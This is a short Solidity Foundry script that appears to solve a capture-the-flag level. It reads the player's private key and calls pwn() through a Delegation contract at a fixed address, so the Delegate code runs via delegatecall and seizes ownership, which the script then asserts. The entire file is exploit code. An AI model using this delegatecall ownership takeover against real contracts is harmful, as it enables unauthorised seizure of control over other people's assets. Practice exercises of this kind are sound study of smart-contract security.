// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/delegate/Delegate.sol";

contract DelegateScript is Script {
    Delegation delegation;
    Delegate delegate;

    function setUp() public {
        delegation = Delegation(0x441AF21F7AAEd32AAD41f108c1d0d90b264ae664);
    }

    function run() public {
        uint256 playerKey = vm.envUint("PRIVATE_KEY");
        address playerAddr = vm.addr(playerKey);
        assert(delegation.owner() != playerAddr);

        delegate = Delegate(address(delegation));

        vm.startBroadcast(playerKey);
        delegate.pwn();
        assert(delegation.owner() == playerAddr);
    }
}
